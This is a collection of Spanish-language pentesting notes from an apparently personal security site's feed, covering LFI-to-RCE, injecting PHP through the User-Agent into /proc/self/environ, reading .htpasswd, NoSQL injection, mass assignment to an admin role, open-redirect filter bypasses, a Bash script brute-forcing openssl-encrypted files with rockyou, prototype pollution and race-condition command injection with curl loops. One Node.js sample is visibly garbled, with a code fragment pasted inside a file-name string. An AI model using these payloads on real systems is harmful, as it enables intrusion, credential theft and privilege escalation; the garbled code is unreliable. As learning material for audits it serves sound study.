<br><br><br>Cuando tenemos un recurso en una web el cual nos lista la función phpinfo(), si tenemos un LFI podríamos derivarlo a un <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> siempre y cuando la funcionalidad file_uploads = On, en caso de que esto  sea así, tendríamos un RCE. <br>Con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> deberíamos interceptar la petición al recurso en donde se lista el phpinfo() y cambiar el método GET a POST así como también simular el formato que aparece cuando enviamos archivos, esto lo podemos hacer googleando <a data-tooltip-position="top" aria-label="https://stackoverflow.com/questions/14962592/whats-content-type-value-within-a-http-request-when-uploading-content" rel="noopener nofollow" class="external-link" href="https://stackoverflow.com/questions/14962592/whats-content-type-value-within-a-http-request-when-uploading-content" target="_blank">"como es el formato del content type cuando subimos archivos"</a>  y nos encontraremos con el siguiente formato: <br>Content-Type: multipart/form-data;boundary=&lt;UN_NOMBRE_X&gt;<br>--&lt;UN_NOMBRE_X&gt;<br>
Content-Disposition: form-data; name="name"; filename=&lt;file_to_upload.extención&gt;<br>
Content-Type: text/plain<br>&lt;content_file_to_upload&gt;<br>
--&lt;UN_NOMBRE_X&gt;<br>De esta manera podríamos intentar subir un archivo php el cual ejecute una determinada acción, en caso de que este ataque sea exitoso, podríamos ver en la respuesta del lado del servidor, que si filtramos por el nombre del archivo que hayamos subido, veríamos algo como lo siguiente: <br>(<br>
[name] =&gt; &lt;file_to_upload.extención&gt;<br>
[type] =&gt; text/plain<br>
[tmp_name] =&gt; /tmp/phpLQnUDn<br>
[error] =&gt; 0<br>
[size] =&gt; 71<br>
)<br>De esta manera se nos proporciona el directorio temporal en el que fue creado, en este ejemplo [tmp_name] =&gt; /tmp/phpLQnUDn por lo que si ahora, con el LFI apuntamos a la ruta "/tmp/phpLQnUDn/&lt;file_to_upload.extención&gt;", no tendríamos nada. Por que? Por que como lo crea, inmediatamente lo borra, ya que es un archivo temporal, por lo que habría que jugar con <a data-href="Race Conditions" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/race-conditions.html" class="internal-link" target="_self" rel="noopener nofollow">Race Conditions</a> para que en algún momento logre ejecutarse el código de manera óptima.<br>Obvio que es lo podemos hacer con <a data-tooltip-position="top" aria-label="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py" rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py" target="_blank">scripts</a> los cuales ya están automatizados <br><br><br><br>Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file <br>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: &lt;?=phpinfo(); ?&gt; 
Copy<br><br>For example, if you are exploiting a web service which has a subdomain that asks you for credentials to access (401 status code) and you have the possibility to run a LFI elsewhere, you can try to get the credentials through the .htaccess and .htpasswd files. <br>/var/www/subdomain/.htpasswd 
Copy<br>If the password is encrypted, you can try to crack it using john. <br><br>/proc/self/cmdline
Copy<br><br>/proc/schedstat
/proc/self/schedstat 
Copy<br><br>/proc/sched_debug 
/proc/self/sched_debug 
Copy<br><br>/proc/net/tcp 
/proc/net/udp 
Copy<br><br>/proc/net/fib_trie 
Copy<br><br>/etc/nginx/sites-enabled/default 
/etc/nginx/sites-available/default 
Copy<br><br>/etc/apache2/sites-enabled/000-default.conf
Copy<br><br>Cuando nos sale el tipico alert para loguearnos en una web, por detrás debería existir dos archivos .htaccess y .htpasswd<br><br>
<br>


<br>/proc/net/tcp
Copy<br>for port in $(cat /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "Open port -&gt; $((0x$port))"; done
Copy<br>
<br>


<br># Ejemplo, si vemos lo sig:
 sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                   
  0: 0100007F:9DF3 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 20791 1 00000000db86742e 100 0 0 10 0   
  1: 2601A8C0:9FFC EFED7522:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 433190 1 00000000d81df3b5 20 4 30 10 -1 
  2: 2601A8C0:8A1C 96C6D62C:01BB 01 00000000:00000000 02:00000B2A 00000000  1000        0 200328 2 00000000ed3be9a7 35 4 30 10 -1 
  3: 2601A8C0:80E4 FCD5C50F:01BB 01 00000000:00000000 02:0000079E 00000000  1000        0 199106 2 000000000b021d7c 34 4 29 10 -1 
  4: 2601A8C0:BED8 C3028F68:01BB 01 00000000:00000000 02:000002C2 00000000  1000        0 371528 2 00000000ed2a5810 48 4 0 10 -1  
  5: 2601A8C0:C5E2 37417522:01BB 01 00000000:00000000 02:00005D33 00000000  1000        0 406579 2 0000000004d8efc7 20 4 31 10 -1 
# Nos quedamos con la segunda columna: 
local_address
0100007F:9DF3
2601A8C0:9FFC
2601A8C0:8A1C
2601A8C0:80E4
2601A8C0:BED8
2601A8C0:C5E2
# Y esta vez con el primer argumento tomando de delimitador los ":"
2601A8C0
# Y verificamos la IP del equipo que sufre el LFI: 
echo "$((0xC0)).$((0xA8)).$((0x01)).$((0x26))" #2601A8C0

Copy<br>
<br>


<br>/proc/sched_debug
Copy<br>
<br>


<br>/proc/net/fib_trie
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/lfi-(local-file-inclusion).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/LFI - (Local File Inclusion).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:32 GMT</pubDate></item><item><title><![CDATA[¿ Que es el <strong>ataque de asignación masiva</strong> ?]]></title><description><![CDATA[ 
 <br><br>El ataque de asignación masiva o Mass-Assignment Attack se basa en la manipulación de parámetros de entrada de una solicitud HTTP para crear o modificar campos en un objeto de modelo de datos en la aplicación web. En lugar de agregar nuevos parámetros, los atacantes intentan explotar la funcionalidad de los parámetros existentes para modificar campos que no deberían ser accesibles para el usuario. <br>Por ejemplo en una aplicación web de gestión de usuarios, un formulario de registro puede tener campos para el nombre usuario, correo electrónico y contraseña. Sin embargo, si la acpliación utiliza una biblioteca o marco que permite la asignación masiva de parámetros, el atacante podría manipular la solicitud HTTP para agregar un parámetro adicional, como el nivel de privilegio del usuario. De esta manera, el atacante podría registrarse como un usuario con privilegios elevados, simplemente agregando un parámetro adicional a la solicitud HTTP.<br><br><br>Para explotar esta vulnerabilidad, una vez más, pueden existir muchos casos, ya sea por intuición, por puro intento, entre otras, por ejemplo....<br>Tenemos una página web en la cual existe una sección de "create account" en donde interceptando la petición con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> vemos que se tramita una estructura tal que asi: <br>{
	"email":"dobliuw2@dobliuw.com",
	 "password":"dobliuw123",
	 "passwordRepeat":"dobliuw123",
	 "securityQuestion":{
		 "id":2,
		 "question":"Mother's maiden name?",
		 "createdAt":"2023-05-16T18:46:09.595Z",
		 "updatedAt":"2023-05-16T18:46:09.595Z"
	 },
	 "securityAnswer":"dobliuw"
 }
Copy<br>Y a la hora de crear el usuario, es decir, dejar tramitar esta petición, vemos una respuesta tal que así: <br>
{
	"status":"success",
	"data":{
		"username":"",
		"deluxeToken":"",
		"lastLoginIp":"0.0.0.0",
		"profileImage":"/assets/public/images/uploads/defaultAdmin.png",
		"isActive":true,
		"id":22,
		"email":"dobliuw2@dobliuw.com",
		"role":"user",
		"updatedAt":"2023-05-16T18:50:27.165Z",
		"createdAt":"2023-05-16T18:50:27.165Z",
		"deletedAt":null
	}
}
Copy<br>Por lo que al ver todos los parámetros de un usuario, podriamos probar si la web es vulnerable a Mass-Assignment Attack intentando asignar un rol, el cual podría ser "admin" en la creación del usuario, modificando el JSON original, agregando el campo: <br>{
	....,
	"role":"admin",
	....
}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/mass-assignment-(parameter-binding).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Mass-Assignment - (Parameter Binding).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:36 GMT</pubDate></item><item><title><![CDATA[Metadatos]]></title><description><![CDATA[ 
 <br><br>Los metadatos son datos que describen otros datos. En general, un grupo de metadatos se refiere a un grupo de datos que describen el contenido informativo de un objeto al que se denomina recurso. <br><br><br>Muchas veces durante una auditoría puede ser una muy buena ídea analizar los metadatos de archivos encontrados en el sistema auditado, sean imagenes, documentos pdf, etc. Esto podría ser util para ayudarnos a conseguir una brecha de seguridad y explotar otras vulnerabilidades, tener una intrución al sistema, entre otras posibles situaciones. <br>Para analizar los metadatos de un recurso podemos hacer uso de la herramienta exiftool. <br>exiftool {file}
Copy<br>En caso de estar trabajando con múltiples recursos podríamos abrir los metadatos de los recursos y filtrar por campos de interes como podría ser Creator, etc. <br>exiftool *.pdf | grep "Creator" 

exiftool *.pdf -creator 
Copy<br>También puede ser interesante analisar el contenido de los documentos, por ejemplo en caso de estar tratando con archivos pdf, con herramientas como <a data-tooltip-position="top" aria-label="https://github.com/jalan/pdftotext" rel="noopener nofollow" class="external-link" href="https://github.com/jalan/pdftotext" target="_blank">pdftotext</a> para convertir el contenido de un archivo pdf a txt. <br>for file in $(ls | grep ".pdf$"); do pdftotext $file; done 
Copy<br>De esta manera estaríamos convirtiendo todos los pdfs a archivos txt. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/metadata-analysis.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Metadata analysis.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:41 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>NoSQL</strong> ?]]></title><description><![CDATA[ 
 <br><br>NoSQL es una amplica clase de sistemas de gestión de bases de datos que difieren del modelo clásico de SGBDR  en aspectos importantes, siendo el más destacado que no usan <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> como lenguaje principal de consultas.<br><br><br>Las inyecciones NoSQL son una vulnerabilidad de seguridad en las aplicaciiones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una apliación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la acpliación sin la debida validación o sanitización. <br>Estas inyecciones funcionan de manera similar a las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a>, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una NoSQLI, el atacante aprovecha las consultas de la base de datos que se basan en documentos en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas. <br><br><br>Así como en las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a>, podemos apollarnos de <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">Payload All The Things</a> para ver el apartado de, en este caso, NoSQL Injections de manera que podemos ver que para explotar estas Inyecciones contamos con varias expresiones.<br>
<br>


<br>


<br>


<br>


<br>


<br>Estas y más expresiones pueden ser aplicadas en formato JSON o URL <br>Ejemplo, imaginemos un metodo GET por url el cual tramite la siguiente petición http. <br><br>De esta manera podriamos aplicar estas expresiones desde la URL:<br><br>Algo que tambien podriamos intentar hacer es cambiar el metodo a POST, el Content-Type a "application/json" y la data como json: <br><br><br>Y tambien comenzar a aplicar las expresiones desde el formato JSON: <br><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/nosqli-(nosql-injections).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/NoSQLI - (NoSQL Injections).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:45 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>open redirect</strong> ?]]></title><description><![CDATA[ 
 <br><br>La vulnerabilidad de redirección abierta, también conocida como Open Redirect, es una vulnerabilidad común en aplicaciones web que puede ser explotada por los atacantes para dirigir a los usuarios a sitios web maliciosos. Esta vulnerabilidad se produce cuando una aplicación web permite a los atacantes manipular la URL de una página de redireccionamiento para redirigir al usuario a un sitio web malicioso. <br>Por ejemplo, supongamos que una aplicación web utiliza un parámetro de redireccionamiento en una URL para dirigir al usuarioa a una página externa después de que se haya autenticado. Si esta URL no valida adecuadamente el parámetro de redireccionamiento y permite a los atacantes modificarlo, los atacantes pueden dirigir al usuario a un sitio web malicioso, en lugar del sitio web legítimo. <br>Un ejemplo de cómo los atacantes pueden explotar esta vulnerabilidad es mediante la creación de correos electrónicos de phishing que parecen legítimos, pero que en realidad contienen enlaces manipulados que redirigen a los usuarios a un sitio web malicioso. Los atacantes pueden utilizar técnincas de ingeniería social para convencer al usuario de que haga click en el enlace, como ofrecer una oferta atractiva o una oportunidad única. <br><br><br>Para prevenir la vulnerabilidad de Open Redirect, es importante que los desarrolladores implementen medidas de seguridad adecuadas en su código, como la validación de las URL de redireccionamiento y la limitación de las opciones de redireccionamiento a sitios web legítimos. Los desarroladores también pueden utilizar técnicas de codificación segura para evitar la manipulación de URL, como la codificación de caracteres especiales y la eliminación de caracteres no válidos. <br><br><br>Existen multiples escenarios como en casi todas las vulnerabilidades, uno de los casos más basicos, podría ser una web que ya no esta activa y redirige al precionar un boton a otra sección de esta página. <br>Por ejemplo al tocar un boton que dice new website se tramita la siguiente petición POST /redirect?newurl=/newsite HTTP/1.1, por lo que si probamos ahora en la URL ingresar /redirect?newurl=https://google.com y vemos que se realiza la redirección a google, efectivamente la web es vulnerable a Open Redirect. <br>Tambien podría ocurrir el caso en el que hayan validaciones, por ejemplo que se detecte que no se puede ingresar un . (punto), de manera que podriamos burlar estas validaciones URL encodeando el punto . ---&gt; %2e y una vez realizado esto, URL encodear el % ---&gt; %25 para tener así, la burla de la validación %252e. <br>O que no se pueda ingresar la / (barra).  Esto se podría burlar simplemente teniendo en cuenta que con HTTPS, no es necesario poner la /. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/open-redirect.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Open Redirect.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:45:50 GMT</pubDate></item><item><title><![CDATA[Openssl]]></title><description><![CDATA[ 
 <br><br>Openssl es una herramienta que proporciona funcionalidades relacionadas con la seguridad de la comunicación y la criptografía. A su vez ofrece una serie de características y funciones para la administraciń de claves, la creación de certificados, la generación de cifrados y hashes, y mucho más.<br><br><br>Openssl permite cifrar y descrifrar datos utilizando diversos algoritmos de cifrado simétrico y asimétrico. Teniendo en cuenta esto, es posible que nos encontremos de cara a una auditoria con archivos cifrados por esta herramienta, por lo que podríamos recurrir a la herramienta file para ver a que nos enfrentamos. <br>file {file.enc}
# {file.enc}: openssl enc'd data with salted password
Copy<br>De esta manera veríamos el output openssl enc'd data with salted password, indicando que el archivo está en un formato cifrado utilizando Openssl y una protección con una determinada contraseña la cual ha sido utilizada con la técnica salting. <br><br>Esto puede ser replicable de nuestro lado, para entender como funciona podríamos hacer uso de openssl para encriptar cierta data almacenada en un archivo y exportarla a uno nuevo haciendo uso de una contraseña.<br>openssl aes-256-cbc -in {initial_data} -out {file.enc}
Copy<br>Luego de correr el comando anterior indicando que queremos cifrar la data del archivo {initial_data} haciendo uso del cifrado aes-256-cbc y exportando la data al archivo final {file.enc} nos pedirá una contraseña la cual nos servirá posteriormente para desencriptar el archivo final. <br><br>Una vez que tengamos en tenencia un archivo cifrado, tenemos que saber el cifrado que se utilizo par cifrar la data y la contraseña. <br>openssl {used_chiper} -in {file_to_decrypt} -pass 'pass:{used_password}'
Copy<br>Una vez corrido el comando anterior indicando el correspondiente cifrado y la correspondiente contraseña podríamos descifrar la data. <br><br><br>Teniendo en cuenta la explicación anterior, podríamos llevarlo a un entorno en el cual no conozcamos el cifrado ni la contraseña, ya que el archivo cifrado podría ser un archivo recuperado en algún punto de una auditoria, de cara a este escenario podríamos pensar en fuerza bruta, haciendo uso de un diccionario de los posibles cifrados, así como otro para las posibles contraseñas.<br>De esta manera simplemente deberíamos ir probando uno por uno hasta dar con el cifrado y la contraseña correspondiente, teniendo en cuenta que el output de la herramienta openssl en caso de indicar una contraseña erronea será en realidad stderr dando como resultado un código de estado no exitoso. <br>#!/bin/bash

# Ctrl + c 

function ctrl_c(){
  echo -e "\n\n\t[!] Quiting...\n\n"
  tput cnorm; exit 1 
}

trap ctrl_c INT 

# Ciphers 

declare -a ciphers=("AES-128-CBC AES-128-CFB AES-128-CFB1 AES-128-CFB8 AES-128-CTR AES-128-ECB AES-128-OFB AES-192-CBC AES-192-CFB AES-192-CFB1 AES-192-CFB8 AES-192-CTR AES-192-ECB AES-192-OFB AES-256-CBC AES-256-CFB AES-256-CFB1 AES-256-CFB8 AES-256-CTR AES-256-ECB AES-256-OFB AES128 AES192 AES256 BF BF-CBC BF-CFB BF-ECB BF-OFB CAMELLIA-128-CBC CAMELLIA-128-CFB CAMELLIA-128-CFB1 CAMELLIA-128-CFB8 CAMELLIA-128-CTR CAMELLIA-128-ECB CAMELLIA-128-OFB CAMELLIA-192-CBC CAMELLIA-192-CFB CAMELLIA-192-CFB1 CAMELLIA-192-CFB8 CAMELLIA-192-CTR CAMELLIA-192-ECB CAMELLIA-192-OFB CAMELLIA-256-CBC CAMELLIA-256-CFB CAMELLIA-256-CFB1 CAMELLIA-256-CFB8 CAMELLIA-256-CTR CAMELLIA-256-ECB CAMELLIA-256-OFB CAMELLIA128 CAMELLIA192 CAMELLIA256 CAST CAST-cbc CAST5-CBC CAST5-CFB CAST5-ECB CAST5-OFB ChaCha20 DES DES-CBC DES-CFB DES-CFB1 DES-CFB8 DES-ECB DES-EDE DES-EDE-CBC DES-EDE-CFB DES-EDE-ECB DES-EDE-OFB DES-EDE3 DES-EDE3-CBC DES-EDE3-CFB DES-EDE3-CFB1 DES-EDE3-CFB8 DES-EDE3-ECB DES-EDE3-OFB DES-OFB DES3 DESX DESX-CBC RC2 RC2-40-CBC RC2-64-CBC RC2-CBC RC2-CFB RC2-ECB RC2-OFB RC4 RC4-40 SEED SEED-CBC SEED-CFB SEED-ECB SEED-OFB")

# Brute Force

if [ ! "$1" ]; then
  echo -e "\n\n\t[!] Usage: $0 {to_decrypt_file}\n\n"
  exit 1
else
  decrypt=$1
  dictionary="/usr/share/wordlists/rockyou.txt"
  tput civis  
  for cipher in ${ciphers[@]}; do
	  /usr/bin/cat $dictionary | while read line; do
	    /usr/bin/openssl $chipher -d -in $decrypt -pass "pass:$line" &amp;&gt;/dev/null &amp;&amp; echo -e "\n\n\t[+] Password found: $line\n\n" &amp;&amp; exit 0
	  done
  done; tput cnorm
fi
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/openssl-cipher-decryption.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Openssl Cipher Decryption.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:46:29 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>Prototype Pollution</strong> ?]]></title><description><![CDATA[ 
 <br><br>El ataque prototype pollution es una técnia de ataque que aprovecha las vulnerabilidades en la implementación de objetos en JavaScript. Esta técnica de ataque se utiliza para modificar la propiedad "prototype" de un objeto en una aplicación web, lo que puede permitir al atacante ejecutar código malicioso o manipular los datos de la aplicación. <br>En JavaScript, la pripiedad "prototype" se utiliza para definir las propiedades y métodos de un objeto. Los atacantes pueden explotar esta caracteríestica de JavaScript para modificar las propiedades y métodos de un objeto y tomar el control de la aplicación. <br>El ataque prototype pollution se produce cuando un atacante modifica la propiedad prototype de un objeto en una aplicación web. Esto se puede lograr mediantes la manipulación de datos qeu se envían a través de formularios o solicitudes AJAX, o mediante la inserción de código malicioso en el código JavaScript de la aplicación. <br>Una vez que el objeto ha sido manipulado, el atacantes puede ejecutar código malicioso en la aplicación, manipular los datos de la misma o tomar el control de la sesión de un usuario. Por ejemplo, un atacante podría modificar la propiedad prototype de un objeto de autenticación de usuario para permitir el acceso a una cuenta sin la necesidad de una contraseña. <br><br><br>Como vimos anteriormente, con el ataque prototype pollution podemos modificar el prototype de un objeto, por ejemplo, supongamos que tenemos una web en donde para ver si el usuario es admin o no, existe una propiedad denominada isAdmin, el cual vale TRUE en caso de que el usuario sea administrador,  o no existe en caso de que no sea administrador. <br>const dobliuw = {
	name: "Dobliuw",
	age: 19,
};

const admin = {
	name: "Administrator",
	age: 45,
	isAdmin: true 
};

console.log(`El usuario ${admin.name} es administrador? ${admin.isAdmin}`); // El usuario Administrator es administrador? true.
console.log(`El usuario ${dobliuw.name} es administrador? ${dobliuw.isAdmin}`); // El usuario Dobliuw es administrador? undefined. 
Copy<br>En este ejemplo, podemos ver la estructura de dos usuarios diferentes con sus valores, ahora, al realizar un prototype pollution la cosa cambia rotundamente, ya que estamos alterando los metodos y propiedades del prototipo de los objetos de manera que podemos alterar los valores. <br>dobliuw.__proto__.isAdmin = "Prototype Pollution"

console.log(`El usuario ${admin.name} es administrador? ${admin.isAdmin}`); // El usuario Administrator es administrador? true.
console.log(`El usuario ${dobliuw.name} es administrador? ${dobliuw.isAdmin}`); // El usuario Dobliuw es administrador? Prototype Pollution. 
Copy<br>En este caso, como no existe la propiedad "isAdmin" dentro del usuario "dobliuw", podemos modificarla en el prototipo para que valga lo que querramos.  Esto es lo que ocurre en un ataque de prototype pollution, la manera de explotarla y el fin a darle puede variar dependiendo mucho las situaciones. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/prototype-pollution.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Prototype Pollution.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:46:40 GMT</pubDate></item><item><title><![CDATA[¿ Que son las <strong>Race Condition</strong> ?]]></title><description><![CDATA[ 
 <br><br>Las condiciones de carrera (Race Condition) son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos. <br>Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema. <br><br><br>Los atacantes pueden aprovecharse de las condiciones de carrera para llevar a cabo ataques de denegación de servicio ( DoS ), sobrescribir datos críticos, obtener acceso no autorizado a recursos, o incluso ejecutar código maliciosos en el sistema. <br>Por ejemplo, supongamos que dos procesos intentan acceder a un archivo al mismo tiempo: uno para leer y el otro para escribir. Si no hay un mecanismo adecuado para sincronizar el acceso al archivo, puede ocurrir que el proceso de lectura lea datos incorrectos del archivo, o que el proceso de escritura sobrescriba datos importantes que necesitan ser preservados. <br>Este ejemplo, se puede dar con el siguiente código: <br>// more code ....
app.get("/", (req, res) =&gt; {
  let hello = "";
  let action = req.query.action ? req.query.action : "run";
  if (action === "validate") {
    let person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }
  } else if (action == "reset") {
    boot_clean();
    boot_reset();
    boot_run();
  } else {
    boot_run();
    try {
      hello = fs.readFileSync("hello.tlet person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }xt", "utf8").toString();
    } catch (error) {
      hello = "Important hello file is missing, please reset.";
      boot_clean();
      boot_reset();
      boot_run();
    }
  }
  res.render("index.ejs", { action: action, hello: hello });
});

const boot_validate = (person) =&gt; {
  fs.writeFileSync("hello.sh", 'echo "' + person + '" &gt; hello.txt');
  exec("echo 'hello.sh updated -- " + Date.now() + "' &gt; log.txt");
  exec("echo 'hello.sh cleaned -- " + Date.now() + "' &gt;&gt; log.txt");
  exec("bash hello.sh");
  const valid = () =&gt; {
    return execSync(
      "sed -n '/^echo \"[A-Za-z0-9 ]*\" &gt; hello.txt$/p' hello.sh"
    ).toString();
  };
  return valid();
};

const boot_clean = () =&gt; {
  exec(`rm hello.txt`);
};

const boot_run = () =&gt; {
  exec(`bash hello.sh`);
};

const boot_reset = () =&gt; {
  fs.writeFileSync("hello.sh", "echo 'Default User' &gt; hello.txt");
};

// .... more code

Copy<br>En este ejemplo tenemos dos funcionalidades muy importantes, la primera es la que se realiza cuando validate = 'action'. <br>let person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
}
Copy<br>Por lo que se ejecuta la función boot_validate con la query person recibida que es nuestro input el cual se va a alojar en el archivo hello.sh el cual se ejecutara posteriormente luego de validar que solo contenga caracteres alfanuméricos. <br>Por otro lado, la funcionalidad importante que tenemos es la que se ejecuta en caso de que nuestra query validate no sea ni 'action' ni 'reset', dando el siguiente código: <br> boot_run();
    try {
      hello = fs.readFileSync("hello.tlet person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }xt", "utf8").toString();
    } catch (error) {
      hello = "Important hello file is missing, please reset.";
      boot_clean();
      boot_reset();
      boot_run();
Copy<br>En esta también vemos que se ejecuta la función boot_validate, si bien esto de primeras este sanitizado, podríamos aprovecharnos de una condición de carrera ya que no esta adecuadamente programado, si bien si ingresamos un comando este se limpia y no se muestra (luego de ejecutarlo), intuimos que por un momento se ejecuta, por lo que si abusando de bucles estamos constantemente leyendo el resultado de la web en donde se lee el contenido hello.txt (Donde se alojaría el output de nuestro comando) a la vez que estamos constantemente ejecutando la petición de la ejecución de un determinado comando, en un punto la aplicación podría tener un fallo ya que ambos procesos, como ocurre en la condición de carrera, están compitiendo por los mismos recursos. <br># Por un lado estamos constantemente enviando la petición de que se ejecute el comando "whoami"
while true; do curl -s -X GET 'http://localhost:5000/?person=`whoami`&amp;action=validate'; done

# Por otro lado, estamos constantemente leyendo el apartado de la web en donde se vuelca el output de estos comandos (Si se diera la condición de carrera y funciona podriamos llegar a ver el output del comando deseado en algunos momentos)
while true, do curl -s -X GET 'http://localhost:5000/?action=run' | html2text | xargs | grep 'Check this out:' ; done 
Copy<br>La prueba y análisis de este código se puede encontrar en este <a data-tooltip-position="top" aria-label="https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition" rel="noopener nofollow" class="external-link" href="https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition" target="_blank">repo</a>. <br><br>En otro ejemplo, tenemos el siguiente código: <br>// more code ...
app.get("/:value", (req, res) =&gt; {
  fs.writeFileSync("shared-file.txt", req.params.value);
  fs.open("shared-file.txt", "r", (err, fd) =&gt; {
    let file = fs.readFileSync("shared-file.txt", "utf8");
    res.setHeader("Content-Type", "text/html", "charset=utf-8");
    res.setHeader(
      "Content-Disposition",
      "attachment; filename=shared-file.txt"
    );
    res.sendFile(__dirname + "/shared-file.txt");
  });
});
// ... more code
